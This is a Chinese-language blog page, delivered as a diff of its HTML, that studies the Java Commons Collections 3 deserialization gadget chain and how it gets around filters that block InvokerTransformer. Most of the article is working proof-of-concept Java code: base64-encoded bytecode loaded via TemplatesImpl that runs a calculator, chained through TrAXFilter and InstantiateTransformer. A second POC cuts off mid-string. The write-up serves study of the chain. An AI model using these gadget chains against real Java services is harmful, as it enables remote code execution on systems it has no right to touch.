@@ -1,0 +1,508 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/bg/6.png">
+  <link rel="icon" href="/img/bg/6.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="海马少年">
+  <meta name="keywords" content="">
+  <meta name="description" content="Java CC3基础看了P神的代码审计，大致看了一遍，发现 CC3 可以粗略的理解为 CC1 加上 TemplatesTmpl加载字节码，所以赶紧回去复习一下。 http:&#x2F;&#x2F;lcdm123.xyz&#x2F;2021&#x2F;11&#x2F;07&#x2F;Java-CC&#x2F; http:&#x2F;&#x2F;lcdm123.xyz&#x2F;2021&#x2F;11&#x2F;10&#x2F;Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java CC3">
+<meta property="og:url" content="http://example.com/2021/11/16/Java-CC3/index.html">
+<meta property="og:site_name" content="Lcdm123">
+<meta property="og:description" content="Java CC3基础看了P神的代码审计，大致看了一遍，发现 CC3 可以粗略的理解为 CC1 加上 TemplatesTmpl加载字节码，所以赶紧回去复习一下。 http:&#x2F;&#x2F;lcdm123.xyz&#x2F;2021&#x2F;11&#x2F;07&#x2F;Java-CC&#x2F; http:&#x2F;&#x2F;lcdm123.xyz&#x2F;2021&#x2F;11&#x2F;10&#x2F;Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211111001023097.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211111002740283.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211111003627512.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211111004610107.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211111005612455.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211111220813349.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211111220917179.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211112233412106.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211111204553382.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211111212011740.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211111212150797.png">
+<meta property="article:published_time" content="2021-11-15T16:27:57.000Z">
+<meta property="article:modified_time" content="2021-11-15T16:29:29.657Z">
+<meta property="article:author" content="海马少年">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/lcdm123/image/raw/master/image-20211111001023097.png">
+  
+  <title>Java CC3 - Lcdm123</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"*","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Lcdm123" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>海马少年</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/bg/6.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Java CC3">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-11-16 00:27" pubdate>
+        2021年11月16日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      12k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      37 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Java CC3</h1>
+            
+            <div class="markdown-body">
+              <h1 id="Java-CC3"><a href="#Java-CC3" class="headerlink" title="Java CC3"></a>Java CC3</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>看了P神的代码审计，大致看了一遍，发现 CC3 可以粗略的理解为 CC1 加上 <code>TemplatesTmpl</code>加载字节码，所以赶紧回去复习一下。</p>
+<p><a target="_blank" rel="noopener" href="http://lcdm123.xyz/2021/11/07/Java-CC/">http://lcdm123.xyz/2021/11/07/Java-CC/</a></p>
+<p><a target="_blank" rel="noopener" href="http://lcdm123.xyz/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/">http://lcdm123.xyz/2021/11/10/Java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</a></p>
+<p>字节码对应的类必须是 <code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> 的子类</p>
+<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><p>这里直接将CC1 与 <code>TemplatesTmpl</code>中的代码简单结合一下，运行测试</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111001023097.png" srcset="/img/loading.gif" lazyload alt="image-20211111001023097"></p>
+<p>但是在 CC3 的链中并没有使用到<code>InvokeTransformer</code>，这是因为在反序列化爆出来之后，一些Java 反序列化过滤器将它拦截了，例如：<a target="_blank" rel="noopener" href="https://github.com/ikkisoft/SerialKiller">https://github.com/ikkisoft/SerialKiller</a></p>
+<h2 id="升级demo"><a href="#升级demo" class="headerlink" title="升级demo"></a>升级demo</h2><p>CommonsCollections3 的目的就是为了绕过一些规则对<code>InvokerTransformer</code>的限制，这里选择利用的是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111002740283.png" srcset="/img/loading.gif" lazyload alt="image-20211111002740283"></p>
+<p>这个类的构造方法中使用了<code>(TransformerImpl)templates.newTransformer()</code> 这样我们就可避免使用<code>InvokerTransformer</code>来手工调用<code>newTransformer()</code></p>
+<p>那么现在的问题就是如何调用<code>TrAXFilter</code>的构造方法，能直接new对象吗？？ 这里选择的方法就是<code> org.apache.commons.collections.functors.InstantiateTransformer</code>，它也实现了一个<code>Transformer</code>接口通过反射来调用构造方法。</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111003627512.png" srcset="/img/loading.gif" lazyload alt="image-20211111003627512"></p>
+<p>绕过了<code>InvokerTransformer</code>加载字节码</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111004610107.png" srcset="/img/loading.gif" lazyload alt="image-20211111004610107"></p>
+<blockquote>
+<p>一个注意的小点就是这里使用的 <code>Templates.class</code> 刚好对应了<code>TrAXFilter</code>的构造方法</p>
+</blockquote>
+<h3 id="Ysoserial中的写法"><a href="#Ysoserial中的写法" class="headerlink" title="Ysoserial中的写法"></a>Ysoserial中的写法</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111005612455.png" srcset="/img/loading.gif" lazyload alt="image-20211111005612455"></p>
+<p>这个里面还是使用的 CC1中的<code>LazyMap</code>，并且利用代理机制调用了<code>invoke</code></p>
+<p>这里直接模仿 Ysoserial 的方法写一个简易的POC</p>
+<h3 id="根据CC1写POC"><a href="#根据CC1写POC" class="headerlink" title="根据CC1写POC"></a>根据CC1写POC</h3><p>测试的时候发现一个问题，在Java7中使用<code>TemplatesImpl</code>类加载字节码的时候会报错，但是在Java8中测试正常</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111220813349.png" srcset="/img/loading.gif" lazyload alt="image-20211111220813349"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211111220917179.png" srcset="/img/loading.gif" lazyload alt="image-20211111220917179"></p>
+<p>这里就导致了我利用<code>TransformerMap</code>构造链子的时候爆出了错误，对比一下两个版本类的区别</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> sun.misc.BASE64Decoder;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransformerMapCC3</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IOException </span>&#123;<br>        BASE64Decoder decoder = <span class="hljs-keyword">new</span> BASE64Decoder();<br>        <span class="hljs-keyword">byte</span>[] bytes = decoder.decodeBuffer(<span class="hljs-string">&quot;yv66vgAAADQAMAoABgAiCgAjACQIACUKACMAJgcAJwcAKAEACXRyYW5zZm9ybQEAcihMY29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +<br>                <span class="hljs-string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAVTG9yZy9sY2Rt&quot;</span> +<br>                <span class="hljs-string">&quot;MTIzL1BheWxvYWQ7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVy&quot;</span> +<br>                <span class="hljs-string">&quot;bmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACkBAKYo&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3Jn&quot;</span> +<br>                <span class="hljs-string">&quot;L2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBh&quot;</span> +<br>                <span class="hljs-string">&quot;Y2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRl&quot;</span> +<br>                <span class="hljs-string">&quot;cmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJh&quot;</span> +<br>                <span class="hljs-string">&quot;dG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxp&quot;</span> +<br>                <span class="hljs-string">&quot;emVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylW&quot;</span> +<br>                <span class="hljs-string">&quot;AQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BAAMoKVYHACoBAApTb3VyY2VG&quot;</span> +<br>                <span class="hljs-string">&quot;aWxlAQAMUGF5bG9hZC5qYXZhDAAdAB4HACsMACwALQEAEGdub21lLWNhbGN1bGF0b3IMAC4ALwEA&quot;</span> +<br>                <span class="hljs-string">&quot;E29yZy9sY2RtMTIzL1BheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwv&quot;</span> +<br>                <span class="hljs-string">&quot;eHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFu&quot;</span> +<br>                <span class="hljs-string">&quot;L2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEA&quot;</span> +<br>                <span class="hljs-string">&quot;EWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEA&quot;</span> +<br>                <span class="hljs-string">&quot;BGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;AAQAAQAHAAgAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAA8ACwAAACAAAwAAAAEADAAN&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAAABAA4ADwABAAAAAQAQABEAAgASAAAABAABABMAAQAHABQAAgAJAAAASQAAAAQAAAABsQAA&quot;</span> +<br>                <span class="hljs-string">&quot;AAIACgAAAAYAAQAAABQACwAAACoABAAAAAEADAANAAAAAAABAA4ADwABAAAAAQAVABYAAgAAAAEA&quot;</span> +<br>                <span class="hljs-string">&quot;FwAYAAMAEgAAAAQAAQATAAkAGQAaAAEACQAAACsAAAABAAAAAbEAAAACAAoAAAAGAAEAAAAYAAsA&quot;</span> +<br>                <span class="hljs-string">&quot;AAAMAAEAAAABABsAHAAAAAEAHQAeAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAK&quot;</span> +<br>                <span class="hljs-string">&quot;AAAADgADAAAAGQAEABoADQAbAAsAAAAMAAEAAAAOAAwADQAAABIAAAAEAAEAHwABACAAAAACACE=&quot;</span>);<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setFieldName(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieldName(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;lcdm123&quot;</span>);<br>        setFieldName(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templates&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        HashMap inerMap = <span class="hljs-keyword">new</span> HashMap();<br>        inerMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;lcdm&quot;</span>);<br>        Map outerMap = TransformedMap.decorate(inerMap, <span class="hljs-keyword">null</span>, chainedTransformer);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);<br>        construct.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object obj = construct.newInstance(Retention.class, outerMap);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(obj);<br>        objectOutputStream.close();<br><br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));<br>        Object o = (Object) objectInputStream.readObject();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldName</span><span class="hljs-params">(Object obj, String Fieldname, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Field field = obj.getClass().getDeclaredField(Fieldname);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>应该是java版本的问题这里的代码并没有执行成功，但是我感觉代码没有错误，这里是java 版本的问题</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211112233412106.png" srcset="/img/loading.gif" lazyload alt="image-20211112233412106"></p>
+<h3 id="CC6结合后的POC"><a href="#CC6结合后的POC" class="headerlink" title="CC6结合后的POC"></a>CC6结合后的POC</h3><p>相比于 CC1 改造的链子，这个比较通用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6ToCC3</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] bytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAMAoABgAiCgAjACQIACUKACMAJgcAJwcAKAEACXRyYW5zZm9ybQEAcihMY29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNo&quot;</span> +<br>                <span class="hljs-string">&quot;ZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAVTG9yZy9sY2Rt&quot;</span> +<br>                <span class="hljs-string">&quot;MTIzL1BheWxvYWQ7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVy&quot;</span> +<br>                <span class="hljs-string">&quot;bmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACkBAKYo&quot;</span> +<br>                <span 